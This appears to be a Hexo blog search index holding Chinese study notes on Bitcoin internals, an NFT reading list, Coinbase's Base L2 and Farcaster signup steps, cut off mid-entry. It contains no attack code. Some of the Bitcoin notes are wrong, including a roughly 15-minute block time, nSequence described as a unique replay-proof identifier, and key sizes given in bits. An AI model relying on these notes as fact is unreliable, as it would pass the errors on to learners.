<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>00-BTC入门</title>
    <link href="/2024/08/07/BlockChain/ETH/00-BTC-%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2024/08/07/BlockChain/ETH/00-BTC-%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="一：比特币密码学与数据结构"><a href="#一：比特币密码学与数据结构" class="headerlink" title="一：比特币密码学与数据结构"></a>一：比特币密码学与数据结构</h1><h2 id="1-哈希函数"><a href="#1-哈希函数" class="headerlink" title="1.哈希函数"></a>1.哈希函数</h2><h3 id="a-常用哈希"><a href="#a-常用哈希" class="headerlink" title="a. 常用哈希"></a>a. 常用哈希</h3><ul><li>sha256</li><li>RIPEMD-160</li></ul><h3 id="b-使用途径"><a href="#b-使用途径" class="headerlink" title="b.使用途径"></a>b.使用途径</h3><ul><li>产生公钥。</li><li>交易进行哈希。</li><li>默克尔树生成。</li><li>跟哈希的生成与验证。</li><li>区块的哈希作为下一个区块的输入，验证区块是否合法。</li></ul><h2 id="2-非对称加解密"><a href="#2-非对称加解密" class="headerlink" title="2.非对称加解密"></a>2.非对称加解密</h2><h3 id="a-使用的算法"><a href="#a-使用的算法" class="headerlink" title="a.使用的算法"></a>a.使用的算法</h3><ul><li>ECDSA</li></ul><h3 id="b-使用的途径"><a href="#b-使用的途径" class="headerlink" title="b.使用的途径"></a>b.使用的途径</h3><ul><li>公钥生成。</li><li>签名，用于脚本的验证，确保花费区块时的合法性。</li><li>验证交易的来源是否合法，对于交易需要进行签名,其中公钥与签名都会放在区块中。</li></ul><h2 id="3-哈希链表"><a href="#3-哈希链表" class="headerlink" title="3.哈希链表"></a>3.哈希链表</h2><p>通过前一个区块的哈希进行作为本次区块计算哈希值的一个输入进行计算本次区块的哈希值。</p><h2 id="4-默克尔树"><a href="#4-默克尔树" class="headerlink" title="4.默克尔树"></a>4.默克尔树</h2><p>通过对于交易进行两两哈希，生成默克尔树，最终生成一个跟哈希值，可以通过全节点提供的某个交易的根哈希路径上的交易哈希可以判断交易是否合法。</p><h1 id="二-区块与交易信息"><a href="#二-区块与交易信息" class="headerlink" title="二.区块与交易信息"></a>二.区块与交易信息</h1><h2 id="1-区块信息"><a href="#1-区块信息" class="headerlink" title="1.区块信息"></a>1.区块信息</h2><p><img src="/./pic/Pasted%20image%2020240807150054.png"></p><ul><li>855743：区块高度即为当前区块在公链中的第几个。</li><li>时间：区块产生的时间。</li><li>大小：区块的大小。</li><li>交易费：所有交易的交易费用。</li><li>确认数：本条链后有几个块。</li><li>转账总金额：交易所有的转账金额的总和。</li><li>挖矿难度。</li><li>交易数：交易数量。</li><li>上一个区块：上一个区块的哈希值，形成一个链式结构。</li><li>默克尔树根哈希：交易的默克尔树的跟哈希。</li><li>coinbase：铸币用户，可以随意写，币是凭空产生的，在输出中写对就行。</li></ul><h2 id="2-交易信息"><a href="#2-交易信息" class="headerlink" title="2.交易信息"></a>2.交易信息</h2><h3 id="a-铸币交易"><a href="#a-铸币交易" class="headerlink" title="a.铸币交易"></a>a.铸币交易</h3><p><img src="/./pic/Pasted%20image%2020240807151207.png"></p><ul><li>coinbase：可以随意写。</li><li>输入地址为随意可修改的信息。</li><li>输出地址为获得记账权的账户。</li><li>输出的总金额为本区块的交易费与铸币奖励的总和。</li><li>本次交易没有交易费用。</li></ul><h3 id="b-普通交易"><a href="#b-普通交易" class="headerlink" title="b.普通交易"></a>b.普通交易</h3><p><img src="/./pic/Pasted%20image%2020240807151713.png"></p><ul><li>wintness：签名+公钥地址。</li><li>nSequence：交易的唯一标志，防止重放攻击。</li><li>类型：交易脚本的类型。</li><li>ScriptPubKey：交易的公钥地址。</li></ul><h1 id="三-区块共识实现与挖矿"><a href="#三-区块共识实现与挖矿" class="headerlink" title="三.区块共识实现与挖矿"></a>三.区块共识实现与挖矿</h1><h2 id="1-区块共识"><a href="#1-区块共识" class="headerlink" title="1.区块共识"></a>1.区块共识</h2><h3 id="a-实现方式"><a href="#a-实现方式" class="headerlink" title="a.实现方式"></a>a.实现方式</h3><p>通过算力实现对于区块的写入，算力越强，尝试的nonce次数越多，就越有可能获取到写入区块的能力，算是基于工作量证明的方式。</p><h2 id="2-挖矿"><a href="#2-挖矿" class="headerlink" title="2.挖矿"></a>2.挖矿</h2><p>介绍：即通过对于交易的组合与区块中某些可修改进行进行调整，从而获取满足目标值的哈希值，才能够获取记账权，从而进行区块上链。</p><h3 id="a-基本原理"><a href="#a-基本原理" class="headerlink" title="a.基本原理"></a>a.基本原理</h3><ul><li>通过对于交易的组合哈希与可修改的数据进行修改，生成一个去区块的哈希，以满足最终的目标值的满足条件。</li><li>每次尝试的结果都是一样的，因为哈希计算没有什么相关性。</li><li>算力强的节点，也只是进行的次数比较多才能够有更高的获得记账权的可能。</li></ul><h3 id="b-可调整的数值"><a href="#b-可调整的数值" class="headerlink" title="b.可调整的数值"></a>b.可调整的数值</h3><p>说明：根据上述2.1与2.2.a中的信息可以获取相关的详细信息。</p><ul><li>交易的重组生成的默克尔树的跟哈希不同。</li><li>时间可以在秒级的范围进行微调，以为比特币的出块时间为15分钟大约。</li><li>nonce：随机值，是主要的调整的方式。</li><li>铸币交易的输入信息：不会进行信息验证，可以在需要的情况下进行随机写入信息。</li><li>铸币交易的输出信息：只要不转币，可以对于输出账户进行随意写入，或者写入需要的信息。</li></ul><h3 id="c-挖矿"><a href="#c-挖矿" class="headerlink" title="c.挖矿"></a>c.挖矿</h3><p>说明：通过调整可变的数值，获取区块的整体哈希值，不断对于可变数值进行随机调整，从而实现目标值的范围，从而获取合法的记账权，区块的哈希值小于等于目标值才是算符合条件的合法区块。</p><h3 id="d-区块发布"><a href="#d-区块发布" class="headerlink" title="d.区块发布"></a>d.区块发布</h3><p>说明：对于所有的交易先进行脚本执行，确认交易的合法性</p><h2 id="3-难度调整"><a href="#3-难度调整" class="headerlink" title="3.难度调整"></a>3.难度调整</h2><ul><li>每2016个区块进行一次难度调整，即2周左右调整一次。</li><li>一般的出块时间都在15分钟左右。</li><li>区块哈希 &lt;&#x3D; 目标值为合法</li><li>difficult &#x3D; difficult * target_time&#x2F;real_time</li><li>target &#x3D; target * real_time&#x2F;target_time</li></ul><h1 id="四-账户与交易"><a href="#四-账户与交易" class="headerlink" title="四.账户与交易"></a>四.账户与交易</h1><h2 id="1-账户生成"><a href="#1-账户生成" class="headerlink" title="1.账户生成"></a>1.账户生成</h2><h3 id="a-私钥生成"><a href="#a-私钥生成" class="headerlink" title="a.私钥生成"></a>a.私钥生成</h3><ul><li>获取256bit的随机值，即为32字节的随机值作为哈希值。</li></ul><h3 id="b-公钥生成"><a href="#b-公钥生成" class="headerlink" title="b.公钥生成"></a>b.公钥生成</h3><ul><li>根据私钥进行点乘法，获取目标点。</li><li>非压缩格式开头为为0x04。</li><li>加上x的32bit与y的32bit，为65位。</li><li>压缩格式只存储x32bit的数值。</li><li>前缀表示y的奇偶性质。</li><li>0x02为偶，0x03为奇。</li></ul><h3 id="c-地址生成"><a href="#c-地址生成" class="headerlink" title="c.地址生成"></a>c.地址生成</h3><ul><li>对于公钥进行第一次SHA-256。</li><li>在进行一次RIPEMD-160哈希，获取20字节的数值。</li><li>在加上前缀0x00表示在主网的地址。</li><li>把前缀加20字节数值一起进行2次SHA-256,去前4个字节最为校验值。</li><li>原地址 &#x3D; 前缀 + 20字节的数值 + 校验值</li><li>1+20+4 &#x3D; 25字节</li><li>目标地址为原地址进行base58编码。</li></ul><h2 id="2-交易进行原理"><a href="#2-交易进行原理" class="headerlink" title="2.交易进行原理"></a>2.交易进行原理</h2><p>说明：比特币也是基于交易的状态机，在每个全节点都会有一个UTXO集合，即为未花费交易的输出。交易主要是通过对于指定账户进行转账，其中有锁定脚本，每次使用比特币消费，都必须进行脚本的验证，并且指定比特币的来源，脚本验证通过才可以进行花费，一般脚本都是要进行身份验证，以获取合法的权限进行交易。<br> <img src="/./pic/Pasted%20image%2020240807151713.png"></p><ul><li>其中的类型即为交易脚本类型。</li><li>脚本公钥为，下次交易的公钥，即为输出值地址的公钥,可通过公钥的哈希值，计算出账户。</li><li>类型：即为脚本的类型。</li></ul><h2 id="3-交易脚本验证的不同类型"><a href="#3-交易脚本验证的不同类型" class="headerlink" title="3.交易脚本验证的不同类型"></a>3.交易脚本验证的不同类型</h2><p>说明：交易验证是通过进行本次交易脚本的输入脚本作为前者，要花费的交易的输出脚本作为后者，然后对与脚本进行执行，执行通过，则说明交易合法，执行不通过则说明交易不合法，不予上链，其中脚本执行时用栈的形式进行执行的，其中脚本类型有几种 P2PK、P2PKH、P2SH。</p><h3 id="a-P2PK-Pay-to-Public-Key"><a href="#a-P2PK-Pay-to-Public-Key" class="headerlink" title="a.P2PK(Pay to Public Key)"></a>a.P2PK(Pay to Public Key)</h3><ul><li>输入脚本：PUSHDATA(Sig)</li><li>输出脚本1：PUSHDATA(Public Key)</li><li>输出脚本2：CHECKSIG</li></ul><p>执行：执行脚本时，先对本次交易的签名进行输入，然后获取输出脚本的公钥，对于本次交易进行验证，因为本次交易的发起者为拥有上次交易输出公钥的地址，对本次交易进行私钥签名，通过对于本次交易进行摘要，然后进行与公钥进行相关的EDSA计算，验证输入签名是否合法，合法则脚本执行通过。</p><h3 id="b-P2PKH-Pay-to-Public-Key-Hash"><a href="#b-P2PKH-Pay-to-Public-Key-Hash" class="headerlink" title="b.P2PKH(Pay to Public Key Hash)"></a>b.P2PKH(Pay to Public Key Hash)</h3><ul><li>输入脚本1：PUSHDATA(Sig)</li><li>输入脚本2：PUSHDATA(Public Key)</li><li>输出脚本1：DUP(复制操作)</li><li>输出脚本2：HASH-160</li><li>输出脚本3：PUSHDATA(Public Key Hash)</li><li>输出脚本4：EQUALVERIFY</li><li>输出脚本5：CHECKSIG<br>执行：首先将Sig与Public Key先后入栈，复制Public key的值入栈，然后对于栈顶的Public Key进行HASH-160的计算，然后把输出脚本的Public Key Hash值入栈，然后出栈两个元素进行相等比较，一个是刚入栈的公钥哈希，一个是计算的公钥哈希，验证成功进行公钥与签名的验证。</li></ul><h3 id="c-P2SH-Pay-to-Script-Hash"><a href="#c-P2SH-Pay-to-Script-Hash" class="headerlink" title="c.P2SH(Pay to Script Hash)"></a>c.P2SH(Pay to Script Hash)</h3><ul><li>输入脚本：…………</li><li>输入脚本：PUSHDATA(Sig)</li><li>输入脚本：PUSHDATA(Serialized redeemScript)</li><li>输出脚本：HASH-160</li><li>输出脚本：PUSHDATA(redeemScript HASH)</li><li>输出脚本：EQUAL<br>执行：先执行外步骤，判断脚本是否相同，再进行执行脚本内的操作执行，其中两步的验证操作是在同一个栈上进行的。</li></ul><h3 id="d-P2SH实现P2PK"><a href="#d-P2SH实现P2PK" class="headerlink" title="d.P2SH实现P2PK"></a>d.P2SH实现P2PK</h3><ul><li>脚本的框架还是上述的P2PSH的，只是序列化赎回脚本内容写入了。</li><li>PUSHDATA(Public Key)</li><li>CHECKSIG</li></ul><p>执行：先进行基本的外循环执行，然后成功之后，栈中只留下了Sig，执行赎回脚本，放入Public Key,然后判断签名是否合法。</p><h3 id="e-P2SH实现多重签名"><a href="#e-P2SH实现多重签名" class="headerlink" title="e.P2SH实现多重签名"></a>e.P2SH实现多重签名</h3><h4 id="普通的多重签名"><a href="#普通的多重签名" class="headerlink" title="普通的多重签名"></a>普通的多重签名</h4><p><img src="/./pic/Pasted%20image%2020240722231809.png"></p><ul><li>其中的红色叉子是脚本的逻辑问题，最终会多弹出一个数值。</li></ul><h4 id="P2SH实现多重签名"><a href="#P2SH实现多重签名" class="headerlink" title="P2SH实现多重签名"></a>P2SH实现多重签名</h4><ul><li>输入脚本：Sig1</li><li>输入脚本：Sig2</li><li>输入脚本：Sig3</li><li>输入脚本：序列化的赎回脚本。</li><li>输出脚本：HASH-160</li><li>输出脚本：脚本哈希。</li><li>输出脚本：判断哈希是否相等。</li><li>赎回脚本：M</li><li>赎回脚本：Pubkey1</li><li>赎回脚本：Pubkey2</li><li>赎回脚本： PubKey3</li><li>赎回脚本：N<br>执行：按顺序执行，其中M为拥有M个合法的的公钥就行，N为所有签名的公钥数量总和。</li></ul><h3 id="f-Proof-of-Burn"><a href="#f-Proof-of-Burn" class="headerlink" title="f.Proof of Burn"></a>f.Proof of Burn</h3><p><img src="/./pic/Pasted%20image%2020240722233216.png"></p><ul><li>return之后的代码都不会进行存储。</li><li>用来销毁比特币，这个币永远不能正确验证。</li><li>销毁以获取小币种的加密货币，AltCoin。</li><li>进行永久数据的存储。</li><li>coinbase也可以进行随意的写入，但是需要有区块的记账权。</li></ul><h1 id="五-分叉"><a href="#五-分叉" class="headerlink" title="五.分叉"></a>五.分叉</h1><h2 id="1-原因"><a href="#1-原因" class="headerlink" title="1.原因"></a>1.原因</h2><ul><li>同时获取合法区块。</li><li>对于交易有分歧。</li><li>恶意的节点进行分叉攻击，区块是合法的，用来不正当竞争。</li><li>回滚交易，使得已经发布的交易无效。</li></ul><h2 id="2-分叉类型"><a href="#2-分叉类型" class="headerlink" title="2.分叉类型"></a>2.分叉类型</h2><h3 id="a-软分叉"><a href="#a-软分叉" class="headerlink" title="a.软分叉"></a>a.软分叉</h3><ul><li>旧节点认新区块，新节点不认旧区块。</li><li>旧认新，新不认旧。</li><li>改变区块限制1M–&gt;0.5M.</li></ul><h3 id="b-硬分叉"><a href="#b-硬分叉" class="headerlink" title="b.硬分叉"></a>b.硬分叉</h3><ul><li>旧节点不认的区块，新节点认。</li><li>新认旧，旧不认新。</li><li>改变区块大小限制由1M–&gt;4M。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>09-资料</title>
    <link href="/2024/08/02/BlockChain/Road/09-%E8%B5%84%E6%96%99/"/>
    <url>/2024/08/02/BlockChain/Road/09-%E8%B5%84%E6%96%99/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>Road</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>Road</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>08-NFT</title>
    <link href="/2024/08/02/BlockChain/Road/08-NFT/"/>
    <url>/2024/08/02/BlockChain/Road/08-NFT/</url>
    
    <content type="html"><![CDATA[<h1 id="NFTer-roadmap-2024"><a href="#NFTer-roadmap-2024" class="headerlink" title="NFTer-roadmap 2024"></a>NFTer-roadmap 2024</h1><p>NFT 学习路线总结，不断更新。</p><p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p><h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><blockquote><p>快速入门</p></blockquote><ul><li><strong>历史发展</strong>：<ul><li>NFT 圣经：关于非同质化代币的所有知识 <a href="https://mp.weixin.qq.com/s/Lr-q6cgfcnWzbVqDDjMebQ">🔗</a></li></ul></li><li><strong>一些解读</strong>：<ul><li>NFT：价值互联网的 HTML <a href="https://mp.weixin.qq.com/s/m8TOUNQypFTJdlK7af6knA">🔗 </a></li><li>深度解析：NFT 有哪些应用场景？非同质化代币最全用例手册 <a href="https://mp.weixin.qq.com/s/taJs6WYFNY6vVAl0w8HkPg">🔗</a></li><li>a16z 前合伙人：NFT 让互联网“Ownable” <a href="https://mp.weixin.qq.com/s/Zukwh08lYzh-2Ai8jXPP6g">🔗</a></li><li>NFT、Metaverse，与泡泡玛特 <a href="https://m.theblockbeats.com/news/23129">🔗</a></li><li>李启威：NFT 的真正价值究竟是什么？ <a href="https://www.chainnews.com/articles/576303926328.htm">🔗</a></li><li>问题在于,你站在哪个世界看 NFT ｜预言家周报#114 <a href="https://mp.weixin.qq.com/s/y7GvQeB46zqE-dVitVpMYw">🔗</a></li></ul></li><li><strong>生态现状</strong>：<ul><li>NFT 生态大起底：最值得关注的项目都在这里 <a href="https://m.theblockbeats.com/news/22526">🔗</a></li><li>全景式解读 NFT 生态全貌，这些重点项目不容错过 <a href="https://mp.weixin.qq.com/s/r4oxyGw6eB7WdibMNcaOgA">🔗</a></li></ul></li><li><strong>精品宝藏</strong>：<ul><li>《从 0 到 1: 精通 NFT——一本万能的 NFT 知识图谱》<a href="https://www.yuque.com/books/share/a8a2de86-76de-4531-8486-ac3d40944557">🔗</a> 🌟</li></ul></li></ul><h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><ul><li><strong>技术原理</strong>（至少了解 ERC-721，其次 ERC-1155）<ul><li>ERC-721：最基础的 NFT<ul><li>EIP：<a href="https://eips.ethereum.org/EIPS/eip-721">🔗</a></li><li>第三方中文翻译：<a href="https://www.jianshu.com/p/e6d4f57fbba6">🔗</a></li><li>第三方中文翻译：<a href="https://www.jianshu.com/p/d5604554c324">🔗</a></li></ul></li><li>ERC-1155：单合约多资产<ul><li>EIP：<a href="https://eips.ethereum.org/EIPS/eip-1155">🔗</a></li><li>第三方中文翻译</li></ul></li><li>ERC-1523：保险单 NFT<ul><li>EIP：<a href="https://eips.ethereum.org/EIPS/eip-1523">🔗</a></li></ul></li><li>ERC-998：可组合 NFT<ul><li>EIP：<a href="https://eips.ethereum.org/EIPS/eip-998">🔗</a></li></ul></li><li>EIP-1948：可变信息的 NFT<ul><li>EIP：<a href="https://eips.ethereum.org/EIPS/eip-1948">🔗</a></li></ul></li><li>EIP-2981：NFT 版税<ul><li>EIP：<a href="https://eips.ethereum.org/EIPS/eip-2981">🔗</a></li></ul></li><li>ERC-875：批量转移 NFT<ul><li>EIP：<a href="https://eips.ethereum.org/EIPS/eip-875">🔗</a></li></ul></li></ul></li><li><strong>市场细分</strong><ul><li>收藏品：<ul><li>项目：CryptoKitties、CryptoPunks、Avastars、GoPepe、Marble.Cards、pixEOS Gallery、PixelChain、Pixel Master</li></ul></li><li>游戏资产：<ul><li>项目：Gods Unchained、Axie Infinity、My Crypto Heroes、CryptoSpaceCommanders、Sorare、F1 Delta Time、ChainZ Arena - Play and Earn、Upload、MegaCryptoPoll、EvolutionLand</li></ul></li><li>虚拟世界：<ul><li>项目：Decentraland、Cryptovoxels、Somnium Space、The Sandbox、Vegas City</li></ul></li><li>加密艺术品：<ul><li>项目：Async Art、 SuperRare、 Nifty Gateway、 KnownOrigin、 MakersPlace</li></ul></li><li>金融：<ul><li>项目：Yinsurance、Aavegotchi、DEGO Finance、Meme、WHALE</li></ul></li><li>功能型 NFT：<ul><li>项目：ENS、Urbit ID、Unstoppable Domains、Terra Virtua</li></ul></li><li>交易市场：<ul><li>一般交易市场：OpenSea、Rarible、Finannel、Axie Markerplace、Atomic Market、Myth.Market、Minitbase、Collectables、Terra Virtua、Fyooz</li><li>艺术品交易市场：SuperRare、MarketPlace、Async Art、Known Origin</li></ul></li><li>文化代币：n0wear、Zora、 Foundation</li><li>其它：传统物理产品，门票、产权、数字身份</li><li>指数基金：<ul><li>NFTX：<a href="https://nftx.org/#/">🔗</a></li></ul></li><li>数据聚合器：<ul><li>nonfungible（NFT 数据聚合、数据分析、新闻评论）<ul><li>官网：<a href="https://nonfungible.com/">🔗</a></li><li>介绍：<a href="https://nonfungible.com/pages/about-us">🔗</a></li></ul></li><li>cryptoslam：<a href="https://cryptoslam.io/">🔗</a></li></ul></li><li>NFT 浏览器-：<ul><li>etherscan：<a href="https://etherscan.io/tokens/label/nft">🔗</a></li></ul></li></ul></li></ul><h2 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h2><ul><li>NFT 基础设施<ul><li>FLOW<ul><li>官网：<a href="https://www.onflow.org/">🔗</a></li><li>技术白皮书：<a href="https://www.onflow.org/technical-paper">🔗</a></li><li>Flow 的团队叫 Dapper Labs，制作了 NFT 历史上交易量最大的 2 个 NFT 应用：CryptoKitties、NBA Top Shot。</li></ul></li><li>ETH<ul><li>CryptoPunks：<a href="https://cryptoslam.io/cryptopunks">🔗</a></li><li>Sorare：<a href="https://cryptoslam.io/sorare">🔗</a></li><li>Axie Infinity：<a href="https://cryptoslam.io/axie-infinity">🔗</a></li><li>CryptoKitties：<a href="https://www.cryptokitties.co/">🔗</a></li><li>MyCryptoHeroes：<a href="https://cryptoslam.io/mycryptoheroes">🔗</a></li><li>Gods Unchained：<a href="https://godsunchained.com/">🔗</a></li><li>F1 Delta Time：<a href="https://cryptoslam.io/f1-delta-time">🔗</a></li></ul></li><li>WAX<ul><li>WAX &#x3D; Worldwide Asset eXchange</li><li>官网：<a href="https://on.wax.io/wax-io/">🔗</a></li><li>白皮书：<a href="https://github.com/worldwide-asset-exchange/whitepaper">🔗</a></li><li>WAX 被称为 NFT 之王，在 Cryptoslam 的数据统计中，前三十名的 NFT 发行项目目有 20 个建立在 WAX 之上，市场份额超过 2&#x2F;3，如同比特币长期占有加密市场约 2&#x2F;3 的市值一样，WAX 在 NFT 领域也长期处于领导地位</li></ul></li><li>Polkadot<ul><li>协议层：<ul><li>NFT-Pallet：<a href="https://github.com/danforbes/pallet-nft">🔗</a></li><li>NFT-Parachain：<a href="https://github.com/w3f-community/nft_parachain">🔗</a></li></ul></li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>Road</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>Road</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>07-Base</title>
    <link href="/2024/08/02/BlockChain/Road/07-Base/"/>
    <url>/2024/08/02/BlockChain/Road/07-Base/</url>
    
    <content type="html"><![CDATA[<h1 id="Base背景介绍"><a href="#Base背景介绍" class="headerlink" title="Base背景介绍"></a>Base背景介绍</h1><h2 id="什么是Base"><a href="#什么是Base" class="headerlink" title="什么是Base"></a>什么是Base</h2><p>Base是总部位于美国的加密货币交易平台Coinbase于2023年8月9日正式发布的以太坊Layer 2(L2)区块链。作为这家上市公司推出的第一个区块链，它受到了加密货币社区的广泛关注。</p><p>Base是与以太坊Layer 2区块链OP Stack上的OPtimism合作开发的，而OP Stack是一个支持OPTimism的标准化开源开发堆栈。Base允许开发者在开发去中心化应用程序(dApps)时能够访问Coinbase的生态系统，该生态系统拥有1.1亿验证用户和超过800亿美元的资产。<br>Base的愿景是创建一个所谓的“超级链”，使用Optimism技术来提高性能，并依靠开发者社区的支持和参与来实现这一愿景。</p><h2 id="Base与其他L2对比"><a href="#Base与其他L2对比" class="headerlink" title="Base与其他L2对比"></a>Base与其他L2对比</h2><ol><li><p>企业背景与支持：<br>Base链由Coinbase支持，这是世界上最大的加密货币交易所之一，为Base提供了强大的用户资源和财务支持。</p></li><li><p>无缝集成与用户体验：<br>Base链与Coinbase的产品、用户和工具实现了无缝集成，提供了易于使用的开发者API和强大的用户访问权限，增强了用户体验。</p></li><li><p>技术基础与创新：Base链建立在Optimism的OP Stack之上，采用Optimistic Rollups技术，与以太坊主网兼容性强，并计划逐步去中心化。</p></li><li><p>TVL增长与市场表现：<br>尽管Base链起步较晚，但其TVL增长迅速，显示出市场的高度认可。Base的TVL在14天内达到了1亿美元以上，随着链上协议的推出和扩展，TVL很可能会继续增长。</p></li><li><p>技术基础与创新</p><p> Base链建立在Optimism的OP Stack之上，采用Optimistic Rollups技术，与以太坊主网兼容性强，并计划逐步去中心化。</p></li><li><p>原生文化与社区活跃度：<br>Base链通过举办链上夏季活动（Onchain Summer Event）、FarCon等活动，成功吸引了社区的关注和参与，增强了其原生文化的影响力。</p></li><li><p>合作伙伴关系：Base链与Optimism Collective合作，共享治理及收入，这种合作关系为Base链提供了额外的资源和支持。</p></li></ol><h2 id="Base链的技术创新，AA钱包的应用"><a href="#Base链的技术创新，AA钱包的应用" class="headerlink" title="Base链的技术创新，AA钱包的应用"></a>Base链的技术创新，AA钱包的应用</h2><p>Base链作为Coinbase孵化的Layer2网络，其设计初衷在于提供一个安全、低成本且对开发者友好的环境。</p><p>AA钱包，即账户抽象（Account Abstraction）钱包，是一种新型的智能合约钱包，它允许用户通过智能合约来管理其资产，从而简化了与区块链互动的过程。</p><p>Base链支持AA钱包，这表明它紧跟以太坊的最新发展和创新，同时也展现了其对提供先进用户体验的承诺。AA钱包的核心优势在于它能够实现更高级的用户交互，比如批量交易处理、自动化的Gas费支付，以及更灵活的资产控制。这些特性使得AA钱包对于普通用户和开发者都极具吸引力。</p><p>例如，AA钱包允许用户通过一笔交易与多个合约互动，这大大简化了用户在使用去中心化应用（DApps）时的复杂性。</p><p>此外，AA钱包还支持使用稳定币支付Gas费，这为用户提供了更多的灵活性和便利性Base链通过整合AA钱包，不仅展示了其对最新区块链技术的支持，还体现了其致力于提供高效、用户友好服务的愿景。随着Base链和AA钱包的进一步发展，预计它们将在推动以太坊生态系统扩展和改善用户体验方面发挥重要作用。</p><p>总体而言，Base链的技术架构，以及在安全性、技术成熟度和监管合作方面的努力，共同构成了其在Layer2领域的竞争力。通过这些特性和合作，Base链旨在为用户提供一个高效、低成本且安全的链上体验。</p><h2 id="Base创始人的愿景与展望"><a href="#Base创始人的愿景与展望" class="headerlink" title="Base创始人的愿景与展望"></a>Base创始人的愿景与展望</h2><p>Jesse Pollak展示了他对Base链开放性、去中心化以及其在推动链上经济和文化传递方面的信念和期望</p><ol><li>Jesse Pollak认为Meme币是链上经济的重要组成部分，并且很高兴看到更多基于Meme币的扩散，帮助世界进入链上经济。</li><li>他指出Base链上的活力很旺盛，特别是Meme币创作者培育了无数新的方式，让人们加入他们的社区，这创造了一种“寒武纪式的上链实验大爆炸”。</li><li>Jesse强调了Base链是“无需许可的”，意味着任何人都可以在上面构建和部署智能合约，Coinbase并没有对合约的单方面控制权，也没有能力冻结Optimistic rollup网络上的资金。</li><li>他提到Base链将逐步去中心化，并在未来几周内分享更多关于Base权力下放的细节。</li><li>Jesse还提到Base链上的Meme币已经帮助数千人加入了第2层网络，并将成为下一个百万人的关键。</li><li>在讨论Base生态系统时，Jesse Pollak强调了通过meme项目覆盖广泛的用户群，以及Base链上社交产品的创新和尝试，如Friend.Tech等。</li><li>Jesse对Base链的未来发展持乐观态度，并认为Meme币将成为吸引数百万用户加入Base网络的关键驱动力。</li></ol><h2 id="Base链的未来"><a href="#Base链的未来" class="headerlink" title="Base链的未来"></a>Base链的未来</h2><p>今年的坎昆升级之后，base又来了新一波的爆发，而base链的创始人在前几天，更是列出了一大批base链的项目，算是明牌表示支持了一众项目，在这些应用背后的，是 Paradigm、a16z、Multicoin、DragonFly、Variant Funds、1confirmation 等一批加密市场知名的 VC 机构。</p><p>而这些 VC 机构也因各自的投资风格不同，在 Base 生态分化出了两种特色，一方是以 Paradigm 为首的「赌徒文化」攒局者，另一方是以 a16z 为中心的长期主义派。但他们的目的都只有一个——为 Base 带来更多的真实用户，创建一个活跃繁荣的链上生态。</p>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>Road</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>Road</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>06-Farcaster社交协议</title>
    <link href="/2024/08/02/BlockChain/Road/06-Farcaster%E7%A4%BE%E4%BA%A4%E5%8D%8F%E8%AE%AE/"/>
    <url>/2024/08/02/BlockChain/Road/06-Farcaster%E7%A4%BE%E4%BA%A4%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="Farcaster-社交协议"><a href="#Farcaster-社交协议" class="headerlink" title="Farcaster 社交协议"></a>Farcaster 社交协议</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Farcaster是一个社交协议，作为一个开源的社交关系图谱，支持开发者在这个协议上构建各种应用，其地位可以看作是Base生态的核心，现在的Base链项目的一手消息都是Farcaster上面的。</p><p>Warpcast是支持这个协议的一个客户端，也是大家最常的一个，简单理解就是一个社交APP，类比推特</p><h2 id="投资背景"><a href="#投资背景" class="headerlink" title="投资背景"></a>投资背景</h2><p>2022 年 7 月 13 日，Farcaster 完成 3000 万美元融资，a16z 领投</p><p><img src="/./img/image-20240512233007556.png" alt="image-20240512233007556"></p><h2 id="增长与社区"><a href="#增长与社区" class="headerlink" title="增长与社区"></a>增长与社区</h2><p>Farcaster最早是一些VC、项目方在玩，比较小众，类似知乎早期的精英模式，如V神就是重度用户，并对Farcaster给予了高度评价。btw，base chain创始人Jesse也在上面活跃。</p><p>尽管起步较慢，Farcaster通过其特色功能“<strong>Frame</strong>”在短时间内实现了用户数量的显著增长，日活跃用户从6000人增长到6万人。</p><h2 id="Frame功能"><a href="#Frame功能" class="headerlink" title="Frame功能"></a>Frame功能</h2><p>Farcaster的一个独特功能是“Frame”，它允许开发者使用API和库来开发一些有趣的功能。这种功能可以嵌入到帖子中，类似于小程序，可以调用所有链的dapp(主要是base、zora),极大地增强了帖子的互动性和功能性。</p><p>e.g 你可以在帖子中直接铸造base nft</p><p><img src="/./img/image-20240512233135377.png" alt="image-20240512233135377"></p><h2 id="Warpcast玩法"><a href="#Warpcast玩法" class="headerlink" title="Warpcast玩法"></a>Warpcast玩法</h2><p>玩法流程：</p><ol><li><p>Google Store&#x2F; 国外苹果id，用来下载warpcast</p></li><li><p>一个绑定了可以付款外币信用卡的苹果账户（可国内账户） &#x2F; Google Store账户，因为需要支付5美金</p></li><li><p>点击邀请链接，输入邮箱 <a href="https://warpcast.com/~/invite-page/399977?id=fdf16c3d">https://warpcast.com/~/invite-page/399977?id=fdf16c3d</a></p></li><li><p>注册好之后，记得保存助记词</p></li><li><p>登陆网页端（用手机扫码登陆）<a 